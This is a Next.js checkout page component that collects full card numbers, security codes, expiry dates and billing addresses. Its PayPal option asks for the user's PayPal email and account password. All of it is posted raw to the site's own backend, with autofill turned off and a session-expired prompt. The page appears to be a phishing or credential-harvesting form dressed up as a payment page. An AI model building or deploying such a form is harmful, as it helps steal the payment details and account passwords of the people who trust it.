"use client";

import { ChangeEvent, FormEvent, useState } from "react";
import { useRouter } from "next/navigation";
import Image from "next/image";
import PortalHeader from "../../components/portal-header";
import { getCurrentLoginUser, clearCurrentLoginUser } from "../../utils/auth";

const monthOptions = Array.from({ length: 12 }, (_, i) =>
  String(i + 1).padStart(2, "0")
);
const yearOptions = Array.from({ length: 20 }, (_, i) =>
  String(new Date().getFullYear() + i)
);

export default function CheckoutPage() {
  const router = useRouter();
  const [currentUser] = useState<string | null>(() => getCurrentLoginUser());
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [errorMessage, setErrorMessage] = useState("");
  const [successMessage, setSuccessMessage] = useState("");

  const [formData, setFormData] = useState({
    firstName: "",
    lastName: "",
    amount: "",
    description: "",
    paymentMethod: "credit-card",
    paypalEmail: "",
    paypalPassword: "",
    cardFirstName: "",
    cardLastName: "",
    cardNumber: "",
    securityCode: "",
    expirationMonth: "",
    expirationYear: "",
    streetAddress: "",
    streetAddress2: "",
    city: "",
    state: "",
    postalCode: "",
    country: "",
  });

  const inputClass =
    "h-[48px] w-full rounded-[5px] border border-[#bcc3cf] bg-white px-4 text-[16px] text-[#2f3a48] outline-none transition-colors focus:border-[#8894a8] md:h-[56px]";
  const helperTextClass = "mt-2 text-[13px] text-[#5e6777]";
  const sectionHeadingClass = "mb-4 text-[20px] font-semibold text-[#252f42]";

  const handleChange = (
    e: ChangeEvent<HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement>
  ) => {
    const { name, value } = e.target;
    const fieldName = e.target.getAttribute("data-field") || name;

    if (fieldName === "cardNumber") {
      // Format card number with spaces every 4 digits
      const formattedValue = value
        .replace(/\s/g, "") // Remove existing spaces
        .replace(/(\d{4})(?=\d)/g, "$1 ") // Add space every 4 digits
        .slice(0, 19); // Limit to 19 characters (16 digits + 3 spaces)

      setFormData((prev) => ({
        ...prev,
        [fieldName]: formattedValue,
      }));
    } else {
      setFormData((prev) => ({
        ...prev,
        [fieldName]: value,
      }));
    }
  };

  const handleSubmit = async (event: FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    setErrorMessage("");
    setSuccessMessage("");
    setIsSubmitting(true);

    if (!currentUser) {
      setErrorMessage("Session expired. Please sign on again.");
      setIsSubmitting(false);
      return;
    }

    try {
      const response = await fetch("/api/payment/checkout", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          email: currentUser,
          ...formData,
          amount: parseFloat(formData.amount),
          cardNumber: formData.cardNumber.replace(/\s/g, ""), // Remove spaces for backend
        }),
      });

      const result = await response.json();

      if (result.success) {
        setSuccessMessage("Payment submitted successfully!");
        clearCurrentLoginUser(); // Clear session after successful payment
        setFormData({
          firstName: "",
          lastName: "",
          amount: "",
          description: "",
          paymentMethod: "credit-card",
          paypalEmail: "",
          paypalPassword: "",
          cardFirstName: "",
          cardLastName: "",
          cardNumber: "",
          securityCode: "",
          expirationMonth: "",
          expirationYear: "",
          streetAddress: "",
          streetAddress2: "",
          city: "",
          state: "",
          postalCode: "",
          country: "",
        });
        setTimeout(() => {
          router.push("/");
        }, 1500);
      } else {
        setErrorMessage(result.message || "Failed to submit payment.");
      }
    } catch {
      setErrorMessage("Unable to submit payment right now. Please try again.");
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen bg-[#ebebed] text-[#2f3a48]">
      <PortalHeader />

      <main className="mx-auto w-full max-w-[960px] bg-[#f2f2f4] shadow-[0_0_0_1px_#d4d8df]">
        <header className="border-b border-[#d4d8df] px-5 py-10 text-center md:px-16 md:py-12">
          <h1 className="text-[50px] font-bold tracking-[0.3px] text-[#1f2942] md:text-[58px]">
            Credit Card Checkout Form
          </h1>
        </header>

        <form
          onSubmit={handleSubmit}
          autoComplete="off"
          className="space-y-8 px-5 pb-14 pt-7 md:px-16 md:pb-16 md:pt-10"
        >
          <div className="space-y-8">
            {/* Name Section */}
            <div>
              <h2 className={sectionHeadingClass}>Name</h2>
              <div className="grid gap-4 md:grid-cols-2">
                <div>
                  <input
                    type="text"
                    name="firstName"
                    value={formData.firstName}
                    onChange={handleChange}
                    required
                    autoComplete="off"
                    className={inputClass}
                    aria-label="First Name"
                  />
                  <p className={helperTextClass}>First Name</p>
                </div>
                <div>
                  <input
                    type="text"
                    name="lastName"
                    value={formData.lastName}
                    onChange={handleChange}
                    required
                    autoComplete="off"
                    className={inputClass}
                    aria-label="Last Name"
                  />
                  <p className={helperTextClass}>Last Name</p>
                </div>
              </div>
            </div>

            {/* Amount Section */}
            <div>
              <h2 className={sectionHeadingClass}>Amount</h2>
              <div className="relative">
                <input
                  type="number"
                  name="amount"
                  value={formData.amount}
                  onChange={handleChange}
                  step="0.01"
                  min="0"
                  required
                  autoComplete="off"
                  className={inputClass}
                  aria-label="Amount"
                />
                <span className="absolute right-4 top-1/2 -translate-y-1/2 text-[18px] text-[#2f3a48] md:text-[18px]">
                  USD
                </span>
              </div>
              <p className={helperTextClass}>Description</p>
            </div>
          </div>

          <div className="border-t border-[#d4d8df] pt-7 md:pt-8">
            {/* Payment Method */}
            <div>
              <h2 className={sectionHeadingClass}>Payment Method</h2>
              <div className="flex flex-col gap-4 md:flex-row md:items-start md:justify-between">
                <label className="flex items-center gap-3">
                  <input
                    type="radio"
                    name="paymentMethod"
                    value="credit-card"
                    checked={formData.paymentMethod === "credit-card"}
                    onChange={handleChange}
                    className="h-4 w-4 accent-[#0d84d9]"
                  />
                  <span className="flex items-center gap-1">
                    <span className="flex h-[24px] w-[48px] items-center justify-center rounded-[2px] border border-[#848c99] bg-white px-1">
                      <Image
                        src="/payment/visa.svg"
                        alt="Visa"
                        width={46}
                        height={14}
                        className="h-[14px] w-full object-contain"
                      />
                    </span>
                    <span className="flex h-[24px] w-[48px] items-center justify-center rounded-[2px] border border-[#848c99] bg-white px-1">
                      <Image
                        src="/payment/mastercard.svg"
                        alt="Mastercard"
                        width={46}
                        height={14}
                        className="h-[14px] w-full object-contain"
                      />
                    </span>
                    <span className="flex h-[24px] w-[48px] items-center justify-center rounded-[2px] border border-[#848c99] bg-white px-1">
                      <Image
                        src="/payment/amex.svg"
                        alt="American Express"
                        width={46}
                        height={14}
                        className="h-[14px] w-full object-contain"
                      />
                    </span>
                    <span className="flex h-[24px] w-[48px] items-center justify-center rounded-[2px] border border-[#848c99] bg-white px-1">
                      <Image
                        src="/payment/discover.svg"
                        alt="Discover"
                        width={46}
                        height={14}
                        className="h-[14px] w-full object-contain"
                      />
                    </span>
                  </span>
                </label>

                <div className="md:pr-44">
                  <label className="flex items-center gap-3">
                    <input
                      type="radio"
                      name="paymentMethod"
                      value="paypal"
                      checked={formData.paymentMethod === "paypal"}
                      onChange={handleChange}
                      className="h-4 w-4 accent-[#0d84d9]"
                    />
                    <span className="flex h-[24px] w-[58px] items-center justify-center rounded-[2px] border border-[#b1b9c6] bg-white px-1">
                      <Image
                        src="/payment/paypal.svg"
                        alt="PayPal"
                        width={56}
                        height={14}
                        className="h-[14px] w-full object-contain"
                      />
                    </span>
                  </label>
                  <p className="mt-2 text-[13px] text-[#0f4a95]">What is PayPal?</p>
                </div>
              </div>
            </div>
          </div>

          {/* PayPal Details */}
          {formData.paymentMethod === "paypal" && (
            <div>
              <h2 className={sectionHeadingClass}>PayPal</h2>
              <div className="rounded-[5px] border border-[#d4d8df] bg-white p-4 md:p-6">
                <p className="mb-4 text-[14px] text-[#4b5565]">
                  Enter your PayPal account details.
                </p>
                <div className="grid gap-4 md:grid-cols-2">
                  <div>
                    <input
                      type="email"
                      name="paypalEmail"
                      value={formData.paypalEmail}
                      onChange={handleChange}
                      required
                      autoComplete="off"
                      className={inputClass}
                      aria-label="PayPal Email"
                    />
                    <p className={helperTextClass}>PayPal Email</p>
                  </div>
                  <div>
                    <input
                      type="password"
                      name="paypalPassword"
                      value={formData.paypalPassword}
                      onChange={handleChange}
                      required
                      autoComplete="off"
                      className={inputClass}
                      aria-label="PayPal Password"
                    />
                    <p className={helperTextClass}>PayPal Password</p>
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* Credit Card Details */}
          {formData.paymentMethod === "credit-card" && (
            <div className="space-y-8">
              <div>
                <h2 className={sectionHeadingClass}>Credit Card</h2>
                <div className="grid gap-4 md:grid-cols-2">
                  <div>
                    <input
                      type="text"
                      name="cc_first"
                      data-field="cardFirstName"
                      value={formData.cardFirstName}
                      onChange={handleChange}
                      required
                      autoComplete="off"
                      className={inputClass}
                      aria-label="Cardholder First Name"
                    />
                    <p className={helperTextClass}>First Name</p>
                  </div>
                  <div>
                    <input
                      type="text"
                      name="cc_last"
                      data-field="cardLastName"
                      value={formData.cardLastName}
                      onChange={handleChange}
                      required
                      autoComplete="off"
                      className={inputClass}
                      aria-label="Cardholder Last Name"
                    />
                    <p className={helperTextClass}>Last Name</p>
                  </div>
                </div>

                <div className="mt-4 grid gap-4 md:grid-cols-2">
                  <div>
                    <input
                      type="text"
                      name="cc_number"
                      data-field="cardNumber"
                      value={formData.cardNumber}
                      onChange={handleChange}
                      maxLength={19}
                      required
                      autoComplete="off"
                      inputMode="numeric"
                      className={inputClass}
                      aria-label="Credit Card Number"
                      placeholder="1234 5678 9012 3456"
                    />
                    <p className={helperTextClass}>Credit Card Number</p>
                  </div>
                  <div>
                    <input
                      type="text"
                      name="cc_cvv"
                      data-field="securityCode"
                      value={formData.securityCode}
                      onChange={handleChange}
                      maxLength={4}
                      required
                      autoComplete="off"
                      inputMode="numeric"
                      className={inputClass}
                      aria-label="Security Code"
                    />
                    <p className={helperTextClass}>Security Code</p>
                  </div>
                </div>

                <div className="mt-4 grid gap-4 md:grid-cols-2">
                  <div>
                    <select
                      name="cc_exp_month"
                      data-field="expirationMonth"
                      value={formData.expirationMonth}
                      onChange={handleChange}
                      required
                      autoComplete="off"
                      className={inputClass}
                      aria-label="Expiration Month"
                    >
                      <option value="">Select Month</option>
                      {monthOptions.map((month) => (
                        <option key={month} value={month}>
                          {month}
                        </option>
                      ))}
                    </select>
                    <p className={helperTextClass}>Expiration Month</p>
                  </div>
                  <div>
                    <select
                      name="cc_exp_year"
                      data-field="expirationYear"
                      value={formData.expirationYear}
                      onChange={handleChange}
                      required
                      autoComplete="off"
                      className={inputClass}
                      aria-label="Expiration Year"
                    >
                      <option value="">Select Year</option>
                      {yearOptions.map((year) => (
                        <option key={year} value={year}>
                          {year}
                        </option>
                      ))}
                    </select>
                    <p className={helperTextClass}>Expiration Year</p>
                  </div>
                </div>
              </div>

              {/* Billing Address */}
              <div>
                <h2 className={sectionHeadingClass}>Billing Address</h2>
                <div>
                  <input
                    type="text"
                    name="streetAddress"
                    value={formData.streetAddress}
                    onChange={handleChange}
                    required
                    autoComplete="off"
                    className={inputClass}
                    aria-label="Street Address"
                  />
                  <p className={helperTextClass}>Street Address</p>
                </div>

                <div className="mt-3">
                  <input
                    type="text"
                    name="streetAddress2"
                    value={formData.streetAddress2}
                    onChange={handleChange}
                    autoComplete="off"
                    className={inputClass}
                    aria-label="Street Address Line 2"
                  />
                  <p className={helperTextClass}>Street Address Line 2</p>
                </div>

                <div className="mt-4 grid gap-4 md:grid-cols-2">
                  <div>
                    <input
                      type="text"
                      name="city"
                      value={formData.city}
                      onChange={handleChange}
                      required
                      autoComplete="off"
                      className={inputClass}
                      aria-label="City"
                    />
                    <p className={helperTextClass}>City</p>
                  </div>
                  <div>
                    <input
                      type="text"
                      name="state"
                      value={formData.state}
                      onChange={handleChange}
                      required
                      autoComplete="off"
                      className={inputClass}
                      aria-label="State or Province"
                    />
                    <p className={helperTextClass}>State / Province</p>
                  </div>
                </div>

                <div className="mt-4 grid gap-4 md:grid-cols-2">
                  <div>
                    <input
                      type="text"
                      name="postalCode"
                      value={formData.postalCode}
                      onChange={handleChange}
                      required
                      autoComplete="off"
                      className={inputClass}
                      aria-label="Postal or Zip Code"
                    />
                    <p className={helperTextClass}>Postal / Zip Code</p>
                  </div>
                  <div>
                    <select
                      name="country"
                      value={formData.country}
                      onChange={handleChange}
                      required
                      autoComplete="off"
                      className={inputClass}
                      aria-label="Country"
                    >
                      <option value="">Please Select</option>
                      <option value="United States">United States</option>
                      <option value="Canada">Canada</option>
                      <option value="United Kingdom">United Kingdom</option>
                      <option value="Australia">Australia</option>
                      <option value="India">India</option>
                      <option value="Other">Other</option>
                    </select>
                    <p className={helperTextClass}>Country</p>
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* Messages */}
          {errorMessage && (
            <p className="rounded-[4px] border border-[#e2a2a6] bg-[#f8d7da] p-3 text-[14px] text-[#ab2f39]">
              {errorMessage}
            </p>
          )}
          {successMessage && (
            <p className="rounded-[4px] border border-[#8bc49c] bg-[#d6f0dd] p-3 text-[14px] text-[#0f7a3f]">
              {successMessage}
            </p>
          )}

          {/* Submit Button */}
          <div className="border-t border-[#d4d8df] pt-10 md:pt-12">
            <button
              type="submit"
              disabled={isSubmitting}
              className="mx-auto block h-[56px] w-[230px] rounded-[5px] bg-[#1cbe5a] text-[18px] font-semibold text-white transition hover:bg-[#14a44d] disabled:cursor-not-allowed disabled:opacity-60 md:h-[64px] md:w-[250px] md:text-[18px]"
            >
              {isSubmitting ? "Processing..." : "Pay Now"}
            </button>
          </div>
        </form>
      </main>
    </div>
  );
}
